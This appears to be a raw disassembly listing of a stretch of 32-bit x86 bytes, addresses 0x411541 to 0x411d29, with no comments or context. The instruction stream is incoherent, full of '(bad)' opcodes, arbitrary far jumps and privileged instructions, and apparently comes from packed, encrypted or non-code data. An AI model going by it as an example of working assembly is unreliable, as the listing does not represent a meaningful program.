  411541:	stos   DWORD PTR es:[edi],eax
  411542:	dec    esi
  411543:	stos   DWORD PTR es:[edi],eax
  411544:	inc    esi
  411545:	mov    edx,0x372b995
  41154a:	sub    eax,0x30f1ded
  41154f:	aad    0xf1
  411551:	into   
  411552:	mov    eax,0xc0b1ff9e
  411557:	dec    ebx
  411558:	addr16 ds xchg edx,eax
  41155b:	(bad)  
  41155c:	jno    0x4114e9
  41155e:	xor    eax,0xab7d8a8f
  411563:	xor    esi,DWORD PTR [edi]
  411565:	push   edi
  411566:	or     DWORD PTR [esi+0x2b],edx
  411569:	mov    ebp,es
  41156b:	mov    BYTE PTR [edx-0x2c],dl
  41156e:	xor    BYTE PTR [ebp+0x620eb4ea],0x80
  411575:	loope  0x4115c3
  411577:	push   edi
  411578:	xchg   ebp,eax
  411579:	test   DWORD PTR [eax+0x46],edi
  41157c:	fisttp DWORD PTR [eax]
  41157e:	push   0xadc69be8
  411583:	cmp    dl,BYTE PTR [esi]
  411585:	and    ch,BYTE PTR [ecx-0x2074ed4f]
  41158b:	lds    ebp,FWORD PTR [eax+0x3b6aa06c]
  411591:	fisttp QWORD PTR [ebx-0x63]
  411594:	push   edx
  411595:	adc    al,0x7
  411597:	cmp    ebx,ecx
  411599:	cmp    esp,ebx
  41159b:	jnp    0x411530
  41159d:	(bad)  
  41159e:	(bad)  
  41159f:	mov    gs,ebp
  4115a1:	loopne 0x411601
  4115a3:	or     BYTE PTR [edi],bh
  4115a5:	dec    ebx
  4115a6:	push   eax
  4115a7:	ins    BYTE PTR es:[edi],dx
  4115a8:	push   ebx
  4115a9:	out    0x76,eax
  4115ab:	mov    dh,0xa7
  4115ad:	cs cdq 
  4115af:	test   BYTE PTR [eax+0x4358950a],al
  4115b5:	addr16 xchg ebx,eax
  4115b7:	mov    cl,0xf5
  4115b9:	jl     0x4115b1
  4115bb:	pop    eax
  4115bc:	xchg   edx,eax
  4115bd:	adc    al,0x83
  4115bf:	push   ebx
  4115c0:	rcl    BYTE PTR [esi],0x9b
  4115c3:	mov    edi,ebp
  4115c5:	inc    ecx
  4115c6:	push   edi
  4115c7:	jb     0x4115a8
  4115c9:	mov    BYTE PTR [ebp+ebp*2+0x7bb6ddb6],dl
  4115d0:	jmp    0x411556
  4115d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115d3:	call   0xdb6b6c43
  4115d8:	jmp    0x411605
  4115da:	fdivr  QWORD PTR [ebx+0x7a8634d7]
  4115e0:	xchg   DWORD PTR [edx-0x69ea4b9],eax
  4115e6:	aaa    
  4115e7:	rcr    edi,0x4e
  4115ea:	inc    edx
  4115eb:	popa   
  4115ec:	clc    
  4115ed:	cmp    BYTE PTR [ecx],bl
  4115ef:	lods   eax,DWORD PTR ds:[esi]
  4115f0:	inc    eax
  4115f1:	mov    eax,es
  4115f3:	imul   BYTE PTR [eax+0x7c]
  4115f6:	add    al,0xcc
  4115f8:	push   eax
  4115f9:	fwait
  4115fa:	mov    cl,bh
  4115fc:	jp     0x4115b6
  4115fe:	mov    ch,0x6f
  411600:	jmp    0x3bc5:0xd239739a
  411607:	int    0xb1
  411609:	mov    edx,0x3c19beea
  41160e:	arpl   WORD PTR [eax+0xb8258b5],ax
  411614:	ins    BYTE PTR es:[edi],dx
  411615:	fstp   QWORD PTR [edi]
  411617:	dec    eax
  411618:	xor    esp,DWORD PTR [ecx+0x1f94d27c]
  41161e:	mov    esp,0xcbcfa324
  411623:	sub    dh,BYTE PTR [ecx-0x65]
  411626:	int    0x4b
  411628:	gs pop ds
  41162a:	jle    0x252dc475
  411630:	ja     0x4115f4
  411632:	iret   
  411633:	sbb    ecx,esi
  411635:	inc    ebp
  411636:	sbb    eax,0xe3fb0e07
  41163b:	xor    cl,BYTE PTR [esi]
  41163d:	fs pop edi
  41163f:	addr16 pop eax
  411641:	in     eax,dx
  411642:	sbb    bh,BYTE PTR [ebx+0x6f]
  411645:	push   ebx
  411646:	jo     0x4115d1
  411648:	mov    edx,0x75c253f3
  41164d:	adc    edx,0xffffffe5
  411650:	push   esi
  411651:	sbb    ah,BYTE PTR [edx-0x37]
  411654:	leave  
  411655:	jg     0x411690
  411657:	mov    edx,0x9aa28254
  41165c:	pop    edx
  41165d:	outs   dx,BYTE PTR ds:[esi]
  41165e:	ret    
  41165f:	mov    dh,0x3e
  411661:	es xor bl,cl
  411664:	(bad)  
  411666:	out    0xd0,eax
  411668:	pop    edx
  411669:	mov    BYTE PTR [edx+ebp*4],bl
  41166c:	dec    edx
  41166d:	sub    BYTE PTR [ebx-0x7e040d1e],ah
  411673:	fild   DWORD PTR [edi-0x7c70ef22]
  411679:	pop    edi
  41167a:	push   ss
  41167b:	popf   
  41167c:	pop    edi
  41167d:	xor    DWORD PTR ds:0xa2e97eda,esi
  411683:	sbb    edi,edx
  411685:	xchg   BYTE PTR [esi-0x5887d3bb],dh
  41168b:	ins    BYTE PTR es:[edi],dx
  41168c:	fdivrp st(7),st
  41168e:	and    bl,BYTE PTR [ecx-0x6e]
  411691:	(bad)  
  411693:	(bad)  
  411694:	in     eax,dx
  411695:	repz jmp 0xd167:0xfd27e1f9
  41169d:	pop    esp
  41169e:	mov    al,ds:0xa60d0738
  4116a3:	inc    ecx
  4116a4:	pop    edi
  4116a5:	icebp  
  4116a6:	into   
  4116a7:	jmp    0x4116c2
  4116a9:	xor    al,0xfa
  4116ab:	int3   
  4116ac:	arpl   WORD PTR [ebp-0x1e035005],bp
  4116b2:	scas   eax,DWORD PTR es:[edi]
  4116b3:	push   es
  4116b4:	sub    eax,0x824a983f
  4116b9:	cmp    eax,0xc78feef9
  4116be:	inc    ebx
  4116bf:	xchg   edx,eax
  4116c0:	and    DWORD PTR [edx],esi
  4116c2:	test   eax,0x740657d2
  4116c7:	fimul  DWORD PTR [esi]
  4116c9:	sub    eax,0xcc513ab4
  4116ce:	(bad)  
  4116cf:	fcom   st(0)
  4116d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116d2:	aaa    
  4116d3:	xor    bl,BYTE PTR [ebx-0x2b]
  4116d6:	sahf   
  4116d7:	add    BYTE PTR [esp+ebx*1+0x6e],ch
  4116db:	fadd   st,st(0)
  4116dd:	mov    ebp,DWORD PTR [esi-0x1362e69a]
  4116e3:	cmc    
  4116e4:	cli    
  4116e5:	fistp  QWORD PTR [edx+0x23]
  4116e8:	push   ecx
  4116e9:	fldcw  WORD PTR [eax+0x5cf57e18]
  4116ef:	or     BYTE PTR [edx*8-0x6b255dbd],cl
  4116f6:	mov    eax,0x33abf55b
  4116fb:	bound  esp,QWORD PTR [edx+0x64]
  4116fe:	pop    eax
  4116ff:	mov    cl,BYTE PTR [ecx]
  411701:	sub    eax,0xf3afd3a1
  411706:	pop    ecx
  411707:	xor    bl,BYTE PTR [ebx+0x3a32733d]
  41170d:	mov    bl,0x58
  41170f:	outs   dx,BYTE PTR ds:[esi]
  411710:	inc    edi
  411711:	shr    esp,1
  411713:	cmp    al,0x38
  411715:	das    
  411716:	inc    edx
  411717:	fwait
  411718:	int3   
  411719:	inc    esi
  41171a:	cmp    al,0xbe
  41171c:	out    0x60,eax
  41171e:	scas   al,BYTE PTR es:[edi]
  41171f:	inc    eax
  411720:	test   ebx,0x301749e4
  411726:	loopne 0x41174a
  411728:	push   ds
  411729:	jae    0x4116f8
  41172b:	mov    dh,0x64
  41172d:	cwde   
  41172e:	mov    esp,0xce09fd61
  411733:	scas   al,BYTE PTR es:[edi]
  411734:	out    dx,eax
  411735:	or     ch,BYTE PTR [ebx]
  411737:	or     BYTE PTR [edi+0x58a8c658],ah
  41173d:	mov    ebp,DWORD PTR [edi+0x71]
  411740:	das    
  411741:	iret   
  411742:	inc    edi
  411743:	(bad)
  411746:	adc    eax,DWORD PTR [edx+eax*8]
  411749:	test   BYTE PTR [ecx],dl
  41174b:	mov    al,ds:0xae8a7a35
  411750:	jp     0x4117a6
  411752:	push   esi
  411753:	sub    BYTE PTR [ebp+0x5c],dh
  411756:	jnp    0x4117a2
  411758:	imul   BYTE PTR ds:0x13df43f0
  41175e:	xor    al,0xea
  411760:	adc    dl,BYTE PTR ds:0xb178db96
  411766:	or     DWORD PTR gs:[eax+esi*2],edx
  41176a:	(bad)  
  41176c:	ror    ch,1
  41176e:	cs pop ss
  411770:	mov    eax,ebp
  411772:	add    esi,ecx
  411774:	sub    al,0x11
  411776:	aas    
  411777:	mov    al,ds:0x2d05beda
  41177c:	mov    bl,0x43
  41177e:	pop    ecx
  41177f:	or     ebp,esp
  411781:	lods   eax,DWORD PTR ds:[esi]
  411782:	xchg   esi,eax
  411783:	outs   dx,BYTE PTR ds:[esi]
  411784:	and    DWORD PTR [eax],0xf3965375
  41178a:	fidiv  DWORD PTR [ebp-0x4f]
  41178d:	or     eax,DWORD PTR [ebp-0x7d]
  411790:	or     eax,0x468ae398
  411795:	add    DWORD PTR [esi],0x28
  411798:	das    
  411799:	popa   
  41179a:	or     DWORD PTR [eax],eax
  41179c:	lods   al,BYTE PTR ds:[esi]
  41179d:	fwait
  41179e:	(bad)  
  41179f:	mov    ebp,0xcd104c03
  4117a4:	push   ebp
  4117a5:	sahf   
  4117a6:	inc    esi
  4117a7:	cli    
  4117a8:	fisubr DWORD PTR [eax-0x69]
  4117ab:	outs   dx,DWORD PTR ds:[esi]
  4117ac:	fst    QWORD PTR [eax+ebp*4-0x11]
  4117b0:	push   esp
  4117b1:	cmp    DWORD PTR [ebp+0x2],0xffffffbf
  4117b5:	mov    al,ds:0xb3a4fb4b
  4117ba:	cld    
  4117bb:	aam    0x8
  4117bd:	inc    edi
  4117be:	inc    eax
  4117bf:	int    0x52
  4117c1:	(bad)  
  4117c2:	mov    al,0x6e
  4117c4:	fwait
  4117c5:	jmp    0xf913:0x57bf4c01
  4117cc:	das    
  4117cd:	inc    ebp
  4117ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117cf:	mov    ds:0xd92dfe41,al
  4117d4:	les    esi,FWORD PTR [ecx+eiz*8]
  4117d7:	jae    0x41180b
  4117d9:	sbb    eax,0x8c96e16f
  4117de:	int3   
  4117df:	sub    eax,DWORD PTR [edx]
  4117e1:	sahf   
  4117e2:	ja     0x41179e
  4117e4:	test   al,0xca
  4117e6:	test   dl,ch
  4117e8:	ret    
  4117e9:	or     eax,0x79c3beb4
  4117ee:	bound  eax,QWORD PTR [eax]
  4117f0:	jbe    0x4117cd
  4117f2:	fist   WORD PTR [eax-0x22f29e1b]
  4117f8:	sbb    eax,0x8cc92d8a
  4117fd:	sbb    BYTE PTR [edx-0x52],0x6f
  411801:	sub    eax,0xc3856aa8
  411806:	aas    
  411807:	scas   al,BYTE PTR es:[edi]
  411808:	ins    DWORD PTR es:[edi],dx
  411809:	xchg   ecx,eax
  41180a:	fisttp QWORD PTR [edx]
  41180c:	or     ax,0x19f9
  411810:	jg     0x411804
  411812:	adc    dx,dx
  411815:	test   BYTE PTR [esp+edi*1-0x58],0x31
  41181a:	or     edx,DWORD PTR [edx+edi*1]
  41181d:	cmp    bl,dl
  41181f:	cwde   
  411820:	push   esi
  411821:	std    
  411822:	xor    ah,BYTE PTR [edx-0x2e]
  411825:	cmp    ebp,DWORD PTR [edi-0x41]
  411828:	fsub   QWORD PTR [edi]
  41182a:	(bad)  
  41182b:	push   esi
  41182c:	call   0xbfd3414f
  411831:	push   esp
  411832:	stos   BYTE PTR es:[edi],al
  411833:	add    eax,0x55253401
  411838:	stos   BYTE PTR es:[edi],al
  411839:	mov    cl,0xe1
  41183b:	xor    BYTE PTR [ecx+0x4d],dl
  41183e:	or     al,0xe9
  411840:	jns    0x41188b
  411842:	sub    eax,0xca59667
  411847:	mov    ebx,0x5d616500
  41184c:	mov    cl,0x4e
  41184e:	sub    ch,BYTE PTR [eax]
  411850:	rcl    DWORD PTR [edi],1
  411852:	inc    eax
  411853:	inc    ch
  411855:	jb     0x41187c
  411857:	fcmovnu st,st(4)
  411859:	sub    al,0x4c
  41185b:	jbe    0x41186b
  41185d:	mov    eax,ds:0xdb7c98cc
  411862:	outs   dx,DWORD PTR ds:[esi]
  411863:	sahf   
  411864:	dec    ecx
  411865:	aas    
  411866:	lods   eax,DWORD PTR ds:[esi]
  411867:	adc    BYTE PTR [edx-0x7b],ah
  41186a:	test   DWORD PTR [edi],esi
  41186c:	mov    ch,0x25
  41186e:	xor    al,BYTE PTR [eax+0x2f853964]
  411874:	push   es
  411875:	lds    ecx,FWORD PTR [ecx]
  411877:	sbb    cl,dh
  411879:	not    BYTE PTR [edi-0x32]
  41187c:	xchg   esi,eax
  41187d:	js     0x41181d
  41187f:	rcr    DWORD PTR [ebx+0x6bbed63],0xed
  411886:	xor    eax,DWORD PTR [edx-0x37]
  411889:	imul   esp,eax,0x5880c30a
  41188f:	ret    
  411890:	xor    eax,0x18eb61b
  411895:	jns    0x4118e4
  411897:	icebp  
  411898:	fdivr  DWORD PTR cs:0x979121b3
  41189f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118a0:	or     DWORD PTR [ebx],eax
  4118a2:	sub    eax,0x17b1249f
  4118a7:	jo     0x4118e7
  4118a9:	ror    DWORD PTR [ecx],1
  4118ab:	loope  0x4118a1
  4118ad:	inc    ebp
  4118ae:	add    eax,0x49ceee4f
  4118b3:	mov    esp,0xc3929c5f
  4118b8:	adc    al,bl
  4118ba:	in     eax,0x77
  4118bc:	or     BYTE PTR [ebx+0x22],ah
  4118bf:	dec    edx
  4118c0:	rcl    DWORD PTR [edx],0x23
  4118c3:	pop    eax
  4118c4:	inc    ebx
  4118c5:	xlat   BYTE PTR ds:[ebx]
  4118c6:	test   bl,al
  4118c8:	sbb    eax,0xdf5d301d
  4118cd:	xchg   ebp,eax
  4118ce:	cmp    al,0x50
  4118d0:	mov    eax,0x91b22a08
  4118d5:	cdq    
  4118d6:	call   0xb778:0x38e41ec2
  4118dd:	push   ebx
  4118de:	and    BYTE PTR [edx+0x2e],bh
  4118e1:	call   0xd1df903b
  4118e6:	(bad)  
  4118e7:	jle    0x411944
  4118e9:	lods   eax,DWORD PTR ds:[esi]
  4118ea:	cwde   
  4118eb:	lods   eax,DWORD PTR ds:[esi]
  4118ec:	pop    eax
  4118ed:	mov    ebp,0x9414960e
  4118f2:	(bad)  
  4118f3:	jmp    0x8e3b:0xecbd5a64
  4118fa:	push   edx
  4118fb:	lods   eax,DWORD PTR ds:[esi]
  4118fc:	adc    DWORD PTR [eax-0xe],edi
  4118ff:	idiv   BYTE PTR [edi+0x14]
  411902:	aas    
  411903:	and    ebp,DWORD PTR [esp+edx*1+0x7c5036aa]
  41190a:	shr    BYTE PTR [ebp-0x50],0xfe
  41190e:	mov    eax,ds:0x505c6cbd
  411913:	push   eax
  411914:	(bad)  
  411915:	das    
  411916:	jne    0x41195f
  411918:	adc    edi,DWORD PTR [edx+0x17]
  41191b:	es jb  0x4118d0
  41191e:	cmp    BYTE PTR [ebx-0x467e3924],dh
  411924:	sbb    ch,BYTE PTR [ebx]
  411926:	daa    
  411927:	cmp    al,0x85
  411929:	cs jne 0x4118b6
  41192c:	pop    ss
  41192d:	sbb    DWORD PTR [esi-0x1ea48480],edi
  411933:	push   ecx
  411934:	mov    edi,0x8a48f550
  411939:	clc    
  41193a:	xchg   ebx,eax
  41193b:	repz (bad) 
  41193d:	dec    esp
  41193e:	xor    BYTE PTR [ecx+0x20],bl
  411941:	loopne 0x411997
  411943:	fwait
  411944:	mov    eax,ds:0xc9539c8f
  411949:	dec    ecx
  41194a:	xor    eax,0xa30f5b3a
  41194f:	and    al,0x7e
  411951:	call   0xb0c2:0x4534cf62
  411958:	scas   al,BYTE PTR es:[edi]
  411959:	add    al,0xc0
  41195b:	fdiv   QWORD PTR [ecx]
  41195d:	xchg   BYTE PTR [ebp+0x6d],dl
  411960:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411962:	add    ch,BYTE PTR [ebx-0x4f26c7ef]
  411968:	xchg   edx,eax
  411969:	ss pop esi
  41196b:	cmp    esi,DWORD PTR [edx]
  41196d:	pop    edx
  41196e:	fsub   QWORD PTR [edi-0x8e74a2f]
  411974:	shl    DWORD PTR [esi-0x794fd987],0x7c
  41197b:	jecxz  0x411915
  41197d:	pop    ebx
  41197e:	push   ebx
  41197f:	mov    al,al
  411981:	mov    ss,eax
  411983:	inc    eax
  411984:	push   edi
  411985:	mov    esp,eax
  411987:	jb     0x4119eb
  411989:	cmp    eax,0x22fa376b
  41198e:	push   DWORD PTR [esi-0x5a]
  411991:	dec    esi
  411992:	or     al,0x6f
  411994:	shr    edi,0xdf
  411997:	and    eax,0xe7c237b0
  41199c:	push   cs
  41199d:	mov    ch,0xa
  41199f:	out    dx,al
  4119a0:	sbb    ebx,0x97aa504f
  4119a6:	mov    al,0xd3
  4119a8:	adc    esp,DWORD PTR [eax-0x11]
  4119ab:	adc    ebp,ebx
  4119ad:	or     esp,esi
  4119af:	es inc ecx
  4119b1:	pop    es
  4119b2:	mov    BYTE PTR [esi-0x42845500],dh
  4119b8:	sub    eax,0xafa2cf9c
  4119bd:	sbb    al,0x21
  4119bf:	mov    cl,0x9e
  4119c1:	cmp    cl,0x96
  4119c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119c5:	sub    al,0xaf
  4119c7:	repz xchg ebp,eax
  4119c9:	ds cmp eax,0xf6de3780
  4119cf:	dec    ebp
  4119d0:	addr16 je 0x411a03
  4119d3:	adc    al,0xf3
  4119d5:	nop
  4119d6:	jmp    0x5536dde
  4119db:	push   ecx
  4119dc:	cmp    BYTE PTR [ebx+0x75],cl
  4119df:	and    DWORD PTR [eax-0x4a],esp
  4119e2:	push   ecx
  4119e3:	pop    edi
  4119e4:	sbb    eax,0x67657939
  4119e9:	std    
  4119ea:	xor    BYTE PTR [edi+0x76],bh
  4119ed:	inc    esp
  4119ee:	rep stos DWORD PTR es:[edi],eax
  4119f0:	dec    ebp
  4119f1:	outs   dx,BYTE PTR ds:[esi]
  4119f2:	nop
  4119f3:	es inc ecx
  4119f5:	mov    WORD PTR [ebp-0x3d8c7eb],es
  4119fb:	mov    ecx,0x91cfca43
  411a00:	sbb    DWORD PTR [ebp+edi*8-0x3b6a5a18],0x48
  411a08:	es jp  0x411a7a
  411a0b:	jno    0x4119a1
  411a0d:	ret    
  411a0e:	scas   eax,DWORD PTR es:[edi]
  411a0f:	mov    ?,WORD PTR [edx-0x2701ebb3]
  411a15:	sahf   
  411a16:	mov    ecx,esi
  411a18:	or     eax,0xd4f6e717
  411a1d:	jp     0x4119f5
  411a1f:	add    ebp,DWORD PTR [esi+0x7d]
  411a22:	rcl    DWORD PTR [ecx+0x42],1
  411a25:	add    esp,DWORD PTR [edx+edi*8]
  411a28:	push   cs
  411a29:	mov    ds:0xe6f240fe,al
  411a2e:	imul   edx,edx,0xfa9ce879
  411a34:	pop    esp
  411a35:	jmp    0x4119e8
  411a37:	ins    DWORD PTR es:[edi],dx
  411a38:	or     DWORD PTR [esi-0x77b7b223],edx
  411a3e:	imul   edi,DWORD PTR [eax+0x2749bd87],0xffffffbf
  411a45:	dec    esi
  411a46:	jp     0x411a47
  411a48:	sbb    esp,esp
  411a4a:	call   0xbd6b:0x52d85eb6
  411a51:	cmp    esi,ebx
  411a53:	ficom  WORD PTR [edi]
  411a55:	jmp    0x46a6:0x367094c7
  411a5c:	push   ds
  411a5d:	dec    esi
  411a5e:	retf   
  411a5f:	jle    0x411aa5
  411a61:	inc    edx
  411a62:	sti    
  411a63:	xchg   ebx,eax
  411a64:	stc    
  411a65:	repz push es
  411a67:	xlat   BYTE PTR ds:[ebx]
  411a68:	jl     0x411a6c
  411a6a:	or     al,0xed
  411a6c:	iret   
  411a6d:	int3   
  411a6e:	push   ss
  411a6f:	mov    bl,0x4f
  411a71:	pop    esp
  411a72:	call   0xa16f:0x488ee0c9
  411a79:	popf   
  411a7a:	jmp    0x411a90
  411a7c:	imul   ecx,DWORD PTR [esi+ebx*1+0x73],0x26a780c8
  411a84:	into   
  411a85:	mov    edx,DWORD PTR [ebx-0x4c]
  411a88:	jl     0x411af9
  411a8a:	out    dx,eax
  411a8b:	lea    edx,[edx-0x59]
  411a8e:	imul   ebp,DWORD PTR [ecx+0x4bf46f46],0xd64f394b
  411a98:	jmp    0xb9c6:0x79bc5f26
  411a9f:	mov    bl,0xd4
  411aa1:	shr    edx,cl
  411aa3:	fsubr  st(2),st
  411aa5:	jle    0x411a2a
  411aa7:	jmp    0x411b23
  411aa9:	sub    edx,ebp
  411aab:	jge    0x411b03
  411aad:	push   edi
  411aae:	jb     0x411ad2
  411ab0:	mov    ecx,0xe6b60ee
  411ab5:	and    DWORD PTR [eax+esi*4+0xb5f860f],0x7
  411abd:	push   ebp
  411abe:	stos   DWORD PTR es:[edi],eax
  411abf:	outs   dx,BYTE PTR ds:[esi]
  411ac0:	add    al,bh
  411ac2:	cmp    DWORD PTR [esp+eiz*4-0x4f84baa0],0xa0778f03
  411acd:	test   BYTE PTR [edi-0x10],dl
  411ad0:	repz pop ss
  411ad2:	mov    BYTE PTR [edx+esi*8+0x7581fe43],dh
  411ad9:	jo     0x411aff
  411adb:	stos   BYTE PTR es:[edi],al
  411adc:	inc    esp
  411add:	xchg   DWORD PTR [ebp+0x71c21fd7],ebx
  411ae3:	fisttp QWORD PTR [edi-0x48]
  411ae6:	jl     0x411b16
  411ae8:	std    
  411ae9:	call   0xf30e:0x75de9c71
  411af0:	out    0x32,al
  411af2:	sub    eax,0x221aea90
  411af7:	test   BYTE PTR [ebp+0x7a],bh
  411afa:	adc    al,0xab
  411afc:	or     ebx,esi
  411afe:	je     0x411b1b
  411b00:	pop    ebx
  411b01:	dec    ebp
  411b02:	add    al,0x62
  411b04:	(bad)  
  411b05:	fisttp WORD PTR [edx+0x41]
  411b08:	jo     0x411ae3
  411b0a:	into   
  411b0b:	mov    cl,0x91
  411b0d:	clc    
  411b0e:	push   esp
  411b0f:	jo     0x411ac1
  411b11:	pop    esp
  411b12:	pop    ds
  411b13:	outs   dx,BYTE PTR ds:[esi]
  411b14:	fistp  WORD PTR cs:[esi+0xa]
  411b18:	rcr    DWORD PTR [edi-0x19],cl
  411b1b:	xlat   BYTE PTR ds:[ebx]
  411b1c:	adc    edx,DWORD PTR [edi+0x6cdedf54]
  411b22:	popa   
  411b23:	xor    bl,BYTE PTR [eax-0x74]
  411b26:	retf   
  411b27:	mov    esi,0x42bf8714
  411b2c:	aaa    
  411b2d:	inc    ebp
  411b2e:	dec    ebp
  411b2f:	(bad)  
  411b30:	sub    ah,BYTE PTR [esi+eax*2+0x3a]
  411b34:	mov    ecx,0x7da2806a
  411b39:	mov    esp,0xa42cd391
  411b3e:	mov    dh,BYTE PTR [ebx+edx*8]
  411b41:	arpl   bp,si
  411b43:	in     eax,dx
  411b44:	dec    edx
  411b45:	repnz pop ecx
  411b47:	xchg   ecx,eax
  411b48:	cmp    edi,ebp
  411b4a:	mov    ebp,0xff402575
  411b4f:	mov    DWORD PTR [ebx],edx
  411b51:	repz ret 
  411b53:	imul   ebp,DWORD PTR [eax+0x16],0x495e7848
  411b5a:	push   cs
  411b5b:	mov    bl,0xef
  411b5d:	scas   al,BYTE PTR es:[edi]
  411b5e:	adc    BYTE PTR [esi+0x51],bh
  411b61:	retf   
  411b62:	mov    ch,0x57
  411b64:	xor    BYTE PTR [ebp-0x5a],al
  411b67:	fdivp  st(0),st
  411b69:	add    al,BYTE PTR [edx+0x56]
  411b6c:	arpl   WORD PTR [ecx-0x15c74189],si
  411b72:	xchg   esp,eax
  411b73:	hlt    
  411b74:	sub    DWORD PTR [edx-0xc579770],0xf644467b
  411b7e:	lock push es
  411b80:	data16 sub ch,ch
  411b83:	or     DWORD PTR [ecx-0x30],0xb612acd3
  411b8a:	stos   BYTE PTR es:[edi],al
  411b8b:	int3   
  411b8c:	aad    0xd5
  411b8e:	clc    
  411b8f:	(bad)  
  411b90:	push   eax
  411b91:	adc    BYTE PTR [edx-0x6ab2c74f],bh
  411b97:	add    ebp,DWORD PTR [ebx-0x58]
  411b9a:	leave  
  411b9b:	cli    
  411b9c:	ret    
  411b9d:	nop
  411b9e:	sti    
  411b9f:	rcl    DWORD PTR [eax-0x3cbb4821],0xd2
  411ba6:	sub    BYTE PTR [ecx+0x21],bh
  411ba9:	fsubrp st(5),st
  411bab:	inc    ebx
  411bac:	lahf   
  411bad:	pop    ecx
  411bae:	push   ebp
  411baf:	mov    cl,0xdc
  411bb1:	and    DWORD PTR [ebx],0xf49debcd
  411bb7:	xor    ebp,0xdc3681ea
  411bbd:	add    BYTE PTR [edi-0x39fcd30],ch
  411bc3:	add    eax,0x86cdfbc4
  411bc8:	pop    edi
  411bc9:	call   0x31b94372
  411bce:	out    0x50,al
  411bd0:	gs dec eax
  411bd2:	sub    al,ch
  411bd4:	setbe  BYTE PTR [eax+0x32e6723]
  411bdb:	inc    ebp
  411bdc:	jmp    0xc7efd9b3
  411be1:	add    ch,0x43
  411be4:	adc    DWORD PTR [ebx+0x7762adef],esi
  411bea:	and    al,BYTE PTR [esi-0x769cb758]
  411bf0:	push   cs
  411bf1:	fmul   DWORD PTR [esi]
  411bf3:	pop    es
  411bf4:	add    DWORD PTR [edx],0x36
  411bf7:	and    al,0xbb
  411bf9:	nop
  411bfa:	jmp    0x411b87
  411bfc:	jb     0x411be9
  411bfe:	adc    dl,BYTE PTR [esp+edi*8+0x53ff8d56]
  411c05:	out    dx,al
  411c06:	jg     0x411c29
  411c08:	out    0xf7,al
  411c0a:	xor    ah,bl
  411c0c:	int    0x9a
  411c0e:	scas   eax,DWORD PTR es:[edi]
  411c0f:	xor    eax,0xd1c761b1
  411c14:	sub    dh,ah
  411c16:	out    dx,eax
  411c17:	pop    esp
  411c18:	out    0x5b,al
  411c1a:	mov    esi,0xbbb7d413
  411c1f:	mov    ebx,0x7248759c
  411c24:	add    dx,bx
  411c27:	int    0x64
  411c29:	pop    es
  411c2a:	mov    ds:0xcb2eecf0,al
  411c2f:	mul    BYTE PTR [edi+0x3f]
  411c32:	lahf   
  411c33:	arpl   si,di
  411c35:	mov    BYTE PTR [ebx-0x6eda4314],bl
  411c3b:	rcl    BYTE PTR [esi-0x12],0x7a
  411c3f:	je     0x411c7e
  411c41:	cli    
  411c42:	stos   BYTE PTR es:[edi],al
  411c43:	in     al,dx
  411c44:	lea    esp,[esi-0x20]
  411c47:	lea    edi,[esi+ebx*2+0x38d7d688]
  411c4e:	jmp    0x411c6c
  411c50:	cmp    BYTE PTR [eax],ch
  411c52:	pop    ebp
  411c53:	xor    eax,0xa3971956
  411c58:	add    eax,0x7c7259ff
  411c5d:	rcl    DWORD PTR [ebx+ebx*1-0x5a2a8f58],1
  411c64:	push   es
  411c65:	bound  esp,QWORD PTR ds:[edx-0x4fc84f98]
  411c6c:	xchg   esi,eax
  411c6d:	lds    ebp,FWORD PTR [edx-0x24f00518]
  411c73:	sub    cl,BYTE PTR [ecx-0x4ccca420]
  411c79:	xchg   ecx,eax
  411c7a:	jmp    0xc9728ab6
  411c7f:	push   es
  411c80:	inc    ebx
  411c81:	push   esp
  411c82:	fild   DWORD PTR [edx-0x147297f]
  411c88:	das    
  411c89:	ja     0x411c9d
  411c8b:	cld    
  411c8c:	add    dl,BYTE PTR [ebx+0x45]
  411c8f:	test   al,0x7b
  411c91:	in     eax,dx
  411c92:	push   0x44
  411c94:	mov    bl,bl
  411c96:	cmp    eax,0xbe2dd3f3
  411c9b:	pop    esi
  411c9c:	ja     0x411cda
  411c9e:	gs pop es
  411ca0:	fcom   st(6)
  411ca2:	repnz pop edi
  411ca4:	and    ah,BYTE PTR [eax+0x5600d2a5]
  411caa:	cld    
  411cab:	scas   eax,DWORD PTR es:[edi]
  411cac:	mov    ecx,0x1c02ff75
  411cb1:	fdiv   QWORD PTR [edx-0x1d3ae5f6]
  411cb7:	mul    BYTE PTR [edx-0x7b]
  411cba:	cwde   
  411cbb:	pushf  
  411cbc:	xchg   edx,eax
  411cbd:	stos   BYTE PTR es:[edi],al
  411cbe:	adc    ch,bh
  411cc0:	call   0xd84f:0xf2bb40e3
  411cc7:	call   ecx
  411cc9:	ror    DWORD PTR [esp+ecx*1],cl
  411ccc:	inc    esi
  411ccd:	add    DWORD PTR [ebx-0x3c],esi
  411cd0:	ins    BYTE PTR es:[edi],dx
  411cd1:	or     al,0x4e
  411cd3:	xchg   BYTE PTR [edx+0x7a9282e5],dl
  411cd9:	and    BYTE PTR [edx+edx*4],bh
  411cdc:	xchg   ebx,eax
  411cdd:	ja     0x411d31
  411cdf:	or     eax,0x36606c4a
  411ce4:	mov    DWORD PTR [edi+0xd],edi
  411ce7:	mov    bh,0x64
  411ce9:	pushf  
  411cea:	xchg   esp,eax
  411ceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ced:	dec    esi
  411cee:	jns    0x411cf6
  411cf0:	call   0x7e98:0x906ed8b4
  411cf7:	mov    DWORD PTR ds:0x903691f4,ecx
  411cfe:	dec    ebx
  411cff:	ins    BYTE PTR es:[edi],dx
  411d00:	adc    BYTE PTR [esp+eax*8],0x8d
  411d04:	jns    0x411d5f
  411d06:	test   eax,edx
  411d08:	sbb    esi,DWORD PTR gs:0x23539886
  411d0f:	addr16 cmc 
  411d11:	or     BYTE PTR [edx],ah
  411d13:	push   esi
  411d14:	es push 0x70d1a4de
  411d1a:	fsub   QWORD PTR [ecx+ecx*1+0x3b]
  411d1e:	sahf   
  411d1f:	mov    BYTE PTR [ebp+0x69436d4e],bh
  411d25:	cmp    DWORD PTR [edi+ebp*2-0x35],ebx
  411d29:	inc    edi
